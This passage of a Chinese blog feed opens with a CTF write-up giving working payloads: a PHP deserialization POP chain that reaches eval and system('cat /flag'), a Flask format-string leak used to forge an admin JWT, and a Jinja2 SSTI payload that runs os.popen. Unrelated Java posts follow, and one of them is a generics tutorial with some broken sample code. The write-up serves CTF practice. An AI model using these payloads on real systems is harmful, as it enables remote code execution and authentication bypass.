class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">entrance</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$start</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;start = <span class="variable">$start</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;start-&gt;helloworld();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">springboard</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$middle</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;middle-&gt;hs;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$end</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$end</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;end = <span class="variable">$end</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$Attribute</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;end);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;serialize&#x27;</span>])) &#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;serialize&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先来了解一些魔术方法：</p><table><thead><tr><th>__construct()</th><th>具有构造函数的类会在每次创建新对象时先调用此方法</th></tr></thead><tbody><tr><td><strong>__destruct()</strong></td><td>某个对象的所有引用都被删除或者当对象被显式销毁时执行</td></tr><tr><td><strong>__get()</strong></td><td>读取不可访问<font color='red'>属性的值</font>,<code>__get</code>会被自动调用</td></tr><tr><td><strong>__call()</strong></td><td>在对象中调用一个不可访问<font color='red'>方法</font>时,<code>__call</code>会自动被调用</td></tr><tr><td><strong>__wakeup()</strong></td><td><code>unserialize()</code> 会检查是否存在一个 <code>__wakeup()</code>方法。如果存在，则会先调用 <code>__wakeup</code> 方法，预先准备对象需要的资源。</td></tr></tbody></table><p>分析上述代码，得知最终入口为evil对象调用的eval函数，从而构造传播链</p><blockquote><p>entrance–&gt;springboard–&gt;evil</p></blockquote><p>可以自行给springboard类增添构造函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">springboard</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$middle</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$x</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;middle = <span class="variable">$x</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;middle-&gt;hs;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$e</span> = <span class="keyword">new</span> evil(<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>);</span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> springboard(<span class="variable">$e</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> entrance(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>得到序列化后的结果 ：<code>O:8:&quot;entrance&quot;:1:&#123;s:5:&quot;start&quot;;O:11:&quot;springboard&quot;:1:&#123;s:6:&quot;middle&quot;;O:4:&quot;evil&quot;:1:&#123;s:3:&quot;end&quot;;s:20:&quot;system(&#39;cat /flag&#39;);&quot;;&#125;&#125;&#125;</code></p><p>最终取得flag：</p><p><img src="https://i.loli.net/2021/09/24/jlzvO5bMwC68ZWr.png"></p><h2 id="地狱通信—改"><a href="#地狱通信—改" class="headerlink" title="地狱通信—改"></a><strong>地狱通信—改</strong></h2><blockquote><p>实际上地狱通信比这个简单，但有时间限制，这题做出来地狱通信也就没有问题了</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask import Flask, render_template, request, session, redirect, make_response</span><br><span class="line"><span class="keyword">from</span> secret import secret, headers, User</span><br><span class="line">import datetime</span><br><span class="line">import jwt</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&quot;/&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def index():</span><br><span class="line">    f = open(<span class="string">&quot;app.py&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    ctx = f.read()</span><br><span class="line">    f.close()</span><br><span class="line">    res = make_response(ctx)</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> in name <span class="keyword">or</span> name == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: name,</span><br><span class="line">    &#125;</span><br><span class="line">    token = jwt.encode(payload, secret, algorithm=<span class="string">&#x27;HS256&#x27;</span>, headers=headers)</span><br><span class="line">    res.set_cookie(<span class="string">&#x27;token&#x27;</span>, token)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">&#x27;/hello&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def hello():</span><br><span class="line">    token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> not token:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>, <span class="number">302</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        name = jwt.decode(token, secret, algorithms=[<span class="string">&#x27;HS256&#x27;</span>])[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    except jwt.exceptions.InvalidSignatureError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Invalid token&quot;</span></span><br><span class="line">    <span class="keyword">if</span> name != <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        user = User(name)</span><br><span class="line">        flag = request.args.get(<span class="string">&#x27;flag&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        message = <span class="string">&quot;Hello &#123;0&#125;, your flag is&quot;</span> + flag</span><br><span class="line">        <span class="keyword">return</span> message.format(user)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>, name=name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>python编写网页，主要有两大块，第一个函数会屏蔽传参的’admin’，并设置cookie留给第二个函数使用，第二个函数又只能用admin访问flag.html</p><p>所以有两个思路：1.绕过第一个admin而在第二个中显示，发现用<code>%00</code>截断可以显示出用户名为admin，但不能打开fllag.html</p><p><font color='red'>2.伪造这个token</font></p><p>查询到python的format函数在网页中有漏洞，参考链接：<a href="https://www.sohu.com/a/296121261_120045376">从两道CTF实例看python格式化字符串漏洞_format (sohu.com)</a></p><p>可以创建普通用户通过该漏洞，带出构造token的secret和headers，从而构造admin的token</p><p><img src="https://i.loli.net/2021/09/21/FtwkxlYZVJECBbO.png"></p><p><img src="https://i.loli.net/2021/09/21/ZwS3b2vdgEW7UYe.png"></p><p>用<code>0.__class__.__init__.__globals__[]</code>带出secret和headers</p><p><img src="https://i.loli.net/2021/09/21/XoKOJLFgbtmxW2y.png"></p><p>利用python的<strong>pyjwt</strong>库来伪造admin的token：(但使用时是用 import jwt)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&#x27;admin&#x27;</span>, &#125;</span><br><span class="line">secret = <span class="string">&#x27;u_have_kn0w_what_f0rmat_i5&#x27;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;alg&#x27;</span>: <span class="string">&#x27;HS256&#x27;</span>, <span class="string">&#x27;typ&#x27;</span>: <span class="string">&#x27;JWT&#x27;</span>&#125;</span><br><span class="line">token = jwt.encode(payload, secret, algorithm=<span class="string">&#x27;HS256&#x27;</span>, headers=headers)</span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure><p>token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiYWRtaW4ifQ.ONh7uQwunkVjB4_ZwuLNIHBGbciqLAtJxQF81elyqBc</p><p>在hello页面发送，得到flag</p><p><img src="https://i.loli.net/2021/09/21/b4ztBhd7ov1sQjY.png"></p><h2 id="让-我-访-问"><a href="#让-我-访-问" class="headerlink" title="让 我 访 问"></a><strong>让 我 访 问</strong></h2><p>本题知识点：SSTI</p><p>SSTI这篇文章写的很好：<a href="https://zhuanlan.zhihu.com/p/93746437">CTF|有关SSTI的一切小秘密【Flask SSTI+姿势集+Tplmap大杀器】</a></p><p>在对post提交的username和passwd进行渗透无果后，转到对register页面的研究上</p><p><font color='red'>对于会自动跳转的页面一定要使用bp抓包分析</font></p><p><img src="https://i.loli.net/2021/09/24/iCDM5RZLwSozUkN.png"></p><p>发现页面跳转是通过“第三方”跳转的，更改为abc，发现abc被显示出来，尝试SSTI注入</p><p><img src="https://i.loli.net/2021/09/24/q7cuzknBXM49HNU.png"></p><p><strong>成功发现注入点!</strong></p><p>先获取object基本类的子类</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[1].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure><p>找到可以利用的os类，通常可以找到<code>&lt;class&#39;os._wrap_close&#39;&gt;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/09/24/GosJh6QWPbeVkRf.png"></p><h2 id="fake-game"><a href="#fake-game" class="headerlink" title="fake game"></a><strong>fake game</strong></h2><p>知识点是<code>原型链污染</code></p><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html%22">博客</a></p><p>题目思路来源<a href="https://github.com/XDSEC/moeCTF_2020">西电安全协会</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Crypto&quot;&gt;&lt;a href=&quot;#Crypto&quot; class=&quot;headerlink&quot; title=&quot;Crypto&quot;&gt;&lt;/a&gt;Crypto&lt;/h1&gt;&lt;h2 id=&quot;beginOfCrypto&quot;&gt;&lt;a href=&quot;#beginOfCrypto&quot; class=&quot;he</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://zephyr-cyber.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Java实现坦克大战练手小游戏</title>
    <link href="http://zephyr-cyber.github.io/bufferfly/blog/871f3241.html"/>
    <id>http://zephyr-cyber.github.io/bufferfly/blog/871f3241.html</id>
    <published>2020-09-18T13:45:28.000Z</published>
    <updated>2022-12-13T12:23:07.697Z</updated>
    
    <content type="html"><![CDATA[<p>自己在摸鱼时间在github上发现某大佬的坦克大战项目，于是就fork下来仔细品读一下，但是发现除了一点多线程，和swt，并没有太多有意思的地方，但是我还是把它敲完，做了一下简单的测试，稍微改动了一下，比如左上角的英文汉化，增加分数显示。em… 就这些。感兴趣的朋友可以简单看看源码。</p><blockquote><p><a href="https://github.com/glassy-sky-lisong/TankGame">坦克大战传送门</a></p></blockquote><p>有有个.idea文件夹，上传时不小心上传上去了，大家clone下来删掉即可，这是idea的个人配置文件夹。不过，idea敲java是真香，[手动狗头.jpg]</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;自己在摸鱼时间在github上发现某大佬的坦克大战项目，于是就fork下来仔细品读一下，但是发现除了一点多线程，和swt，并没有太多有意思的地方，但是我还是把它敲完，做了一下简单的测试，稍微改动了一下，比如左上角的英文汉化，增加分数显示。em… 就这些。感兴趣的朋友可以简单</summary>
      
    
    
    
    <category term="Java那点事" scheme="http://zephyr-cyber.github.io/categories/Java%E9%82%A3%E7%82%B9%E4%BA%8B/"/>
    
    <category term="练手项目" scheme="http://zephyr-cyber.github.io/categories/Java%E9%82%A3%E7%82%B9%E4%BA%8B/%E7%BB%83%E6%89%8B%E9%A1%B9%E7%9B%AE/"/>
    
    
    <category term="Java那点事" scheme="http://zephyr-cyber.github.io/tags/Java%E9%82%A3%E7%82%B9%E4%BA%8B/"/>
    
    <category term="练手项目" scheme="http://zephyr-cyber.github.io/tags/%E7%BB%83%E6%89%8B%E9%A1%B9%E7%9B%AE/"/>
    
  </entry>
  
  <entry>
    <title>Maven一直reading读取pom.xml文件问题</title>
    <link href="http://zephyr-cyber.github.io/bufferfly/blog/f62be7ba.html"/>
    <id>http://zephyr-cyber.github.io/bufferfly/blog/f62be7ba.html</id>
    <published>2020-09-05T15:24:11.000Z</published>
    <updated>2022-12-13T12:34:50.006Z</updated>
    
    <content type="html"><![CDATA[<p>关于Maven一直reading读取pom.xml文件问题很是蛋疼，我是用的IDEA，想创建一个SpringBoot去做新项目的后端，但是创建完成后，右下角就一直在读取pom文件，依赖包下不来就什么也干不了，而且退出也没有用，会一直堵塞在哪里，只能用资源管理器kill掉IDEA的桌面任务，然后想通过卸载IDEA来重新建项目，但是没有效果，无奈只能面向百度了，看了一些帖子，据说是网络配置问题，其解决的方案大致这有几种：</p><ol><li>修改HOST文件的 127.0.0.1为localhost，在终端输入 *** netsh winsock reset*** 我的HOST的确是在安装navicat时候改过，然后就修改重启后也没有效果</li><li>添加本地maven到环境变量，这个有效，不过是在降低springboot版本之后添加的</li><li>降低springboot版本，默认是2.3.3，降低到2.2.*</li><li>在IDEA的Help菜单下的showlogExpore，查看运行日志，检查问题，我看了一遍，并没有明显的错误</li></ol><p>折腾了挺长时间，现在分享给大家，帮助大家在遇到此类问题的小伙伴能尽快解决，以免耽误工作。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;关于Maven一直reading读取pom.xml文件问题很是蛋疼，我是用的IDEA，想创建一个SpringBoot去做新项目的后端，但是创建完成后，右下角就一直在读取pom文件，依赖包下不来就什么也干不了，而且退出也没有用，会一直堵塞在哪里，只能用资源管理器kill掉ID</summary>
      
    
    
    
    <category term="Java那点事" scheme="http://zephyr-cyber.github.io/categories/Java%E9%82%A3%E7%82%B9%E4%BA%8B/"/>
    
    <category term="Maven" scheme="http://zephyr-cyber.github.io/categories/Java%E9%82%A3%E7%82%B9%E4%BA%8B/Maven/"/>
    
    
    <category term="Java" scheme="http://zephyr-cyber.github.io/tags/Java/"/>
    
    <category term="Maven" scheme="http://zephyr-cyber.github.io/tags/Maven/"/>
    
    <category term="SpringBoot" scheme="http://zephyr-cyber.github.io/tags/SpringBoot/"/>
    
  </entry>
  
  <entry>
    <title>Java泛型之上、下边界通配符的理解(初学)</title>
    <link href="http://zephyr-cyber.github.io/bufferfly/blog/4ad3c53.html"/>
    <id>http://zephyr-cyber.github.io/bufferfly/blog/4ad3c53.html</id>
    <published>2020-09-02T11:15:25.000Z</published>
    <updated>2022-12-15T02:59:50.916Z</updated>
    
    <content type="html"><![CDATA[<h2 id="泛型的由来"><a href="#泛型的由来" class="headerlink" title="泛型的由来"></a>泛型的由来</h2><h3 id="为什么需要泛型"><a href="#为什么需要泛型" class="headerlink" title="为什么需要泛型"></a>为什么需要泛型</h3><p>&emsp;&emsp;Java的数据类型一般都是在定义时就需要确定，这种强制的好处就是类型安全，不会出现像弄一个ClassCastException的数据给jvm，数据安全那么执行的class就会很稳定。但是假如说我不知道这个参数要传什么类型的，因为公司需求在变，如果写死的那就只能便以此需求就改一次，很麻烦。sun公司也注意到这个问题，这样会让代码的灵活性降低，他们就研究出了泛型。</p><h3 id="泛型初识"><a href="#泛型初识" class="headerlink" title="泛型初识"></a>泛型初识</h3><p>&emsp;&emsp;什么是泛型，可以字面理解就是一个泛泛的类型，他是不确定的，在Java代码编译的时候用泛型是不会出错的，而在运行期时就会报错，说你这种第一是不合理的。这是为什么呢。因为为了提高灵活性，就在编译时期将条件放宽，但是泛型一定要在运行的时候告诉jvm你给我的数据到底是什么类型的，否则jvm会是懵逼的。所以泛型的好处就是将类型的灵活性提高，也只是在Java语法的基础上提高，不过泛型还是比较实用的。</p><h3 id="何时使用泛型"><a href="#何时使用泛型" class="headerlink" title="何时使用泛型"></a>何时使用泛型</h3><p>&emsp;&emsp;泛型的应用场景就是应用在模型（可以理解为存储数据的盒子），我为了这个盒子适用更多的地方我就用将需要存入的数据用一个泛型表示，当然可以传入多值。如果是相同类型的对象就用一个泛型的数组比较好，学过集合的小伙伴应该都知道，没学过的那你应该补补课了。</p><p><em><strong>泛型的语法</strong></em></p><pre><code>public class A&lt;T extends B&gt;&#123;   T t;&#125;</code></pre><h2 id="泛型的缺点或者为什么需要上、下边界"><a href="#泛型的缺点或者为什么需要上、下边界" class="headerlink" title="泛型的缺点或者为什么需要上、下边界"></a>泛型的缺点或者为什么需要上、下边界</h2><p>&emsp;&emsp;泛型的虽然强大，但是世界上任何东西东部是完美的。它也有缺陷。比如说我有一个盒子我想装苹果，但是我还可能想装香蕉那怎么办。那还不好说，在给一个参数不就行了，那十个呢，二十个呢。em….的确是。如果说我们想装的东西都属于一个类并且只要是这个类的子类就可以装。这个想法sun为我们想好了。那就是用上边界通配符。语法是<T entends M> T是泛型，M是T的父类。我们就定义一个水果类（Fruit），盛装就容器就是盘子（Dish），现在我们就可以装任何水果了，不错吧！</p><p><em><strong>上边界Java代码</strong></em></p><pre><code>public class Dish&lt;T extends Fruit&gt;&#123;  private T fruitChild;  public Dish(T fruitChild)&#123;    this.fruitChild = fruitChild;  &#125;  public T getFruitChild()&#123;    return fruitChild;  &#125;    public void setFruitChild(T f)&#123;    this.fruitChild = f;  &#125;  public static void main(String[] args)&#123;    Dish dish = new Dish&lt;apple&gt;();    Apple apple = new apple(); //apple must be Fruit child;    dish.setFruitChild(apple);    system.out.printf(dish.getFruitChild);  &#125;&#125;</code></pre><p><em><strong>下边界Java代码</strong></em></p><pre><code>public class Dish&lt;T super Apple&gt;&#123;  private T appleFather;  public Dish(T appleFather)&#123;    this.appleFather = appleFather;  &#125;  public T getAppleFather()&#123;    return appleFather;  &#125;    public void setAppleFather(T f)&#123;    this.appleFather = f;  &#125;  public static void main(String[] args)&#123;    Dish dish = new Dish&lt;Fruit&gt;();    Fruit fruit = new Fruit(); //fruit must be apple son;    dish.setAppleFather(fruit);    system.out.printf(dish.getAppleFather);  &#125;&#125;</code></pre><h2 id="什么是上边界通配符"><a href="#什么是上边界通配符" class="headerlink" title="什么是上边界通配符"></a>什么是上边界通配符</h2><p>&emsp;&emsp;当泛型T给定形如<T extends A> 的A类型到A类型任何子类的限制域，可以匹配任何在此限制域中的类型，此种表示叫上边界通配符。<br>###上边界通配符理解<br><img src="https://images2015.cnblogs.com/blog/820480/201611/820480-20161125004120143-1731938777.png" alt="png"></p><h2 id="什么是下边界通配符"><a href="#什么是下边界通配符" class="headerlink" title="什么是下边界通配符"></a>什么是下边界通配符</h2><p>&emsp;&emsp;当泛型T给定形如<T super A> 的A类型到A类型任何父类的限制域，可以匹配任何在此限制域中的类型，此种表示叫下边界通配符。</p><h3 id="下边界通配符理解"><a href="#下边界通配符理解" class="headerlink" title="下边界通配符理解"></a>下边界通配符理解</h3><p><img src="https://images2015.cnblogs.com/blog/820480/201611/820480-20161125004216471-1377946016.png" alt="png"></p><h2 id="上下边界通配符的缺点"><a href="#上下边界通配符的缺点" class="headerlink" title="上下边界通配符的缺点"></a>上下边界通配符的缺点</h2><p>&emsp;&emsp;上界&lt;? extends T&gt;不能往里存，只能往外取。<br>###解释<br>&emsp;&emsp;因为编译器只知道传入的是T的子类，但具体是哪一个编译器不知道，他只标注了一个占位符，当？传过来时，他不知道这能不能和占位符匹配，所以set不了。<br>&emsp;&emsp;下界&lt;? super T&gt;不影响往里存，但往外取只能放在Object对象里。</p><h3 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h3><p>&emsp;&emsp;因为下边界已经限制了？的粒度，他只可能是T本身或者是T的父类。我们想想，我想要一个T，你却返回给我一个比T小的Object，这样我们就因为精度损失而拿不到想要的数据了。</p><blockquote><p>感谢各位童鞋的阅读，希望大家动一动发财的小手点一下推荐QAQ。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;泛型的由来&quot;&gt;&lt;a href=&quot;#泛型的由来&quot; class=&quot;headerlink&quot; title=&quot;泛型的由来&quot;&gt;&lt;/a&gt;泛型的由来&lt;/h2&gt;&lt;h3 id=&quot;为什么需要泛型&quot;&gt;&lt;a href=&quot;#为什么需要泛型&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    <category term="博客园博文" scheme="http://zephyr-cyber.github.io/categories/%E5%8D%9A%E5%AE%A2%E5%9B%AD%E5%8D%9A%E6%96%87/"/>
    
    <category term="博客美化" scheme="http://zephyr-cyber.github.io/categories/%E5%8D%9A%E5%AE%A2%E5%9B%AD%E5%8D%9A%E6%96%87/%E5%8D%9A%E5%AE%A2%E7%BE%8E%E5%8C%96/"/>
    
    
    <category term="博客园" scheme="http://zephyr-cyber.github.io/tags/%E5%8D%9A%E5%AE%A2%E5%9B%AD/"/>
    
  </entry>
  
</feed>
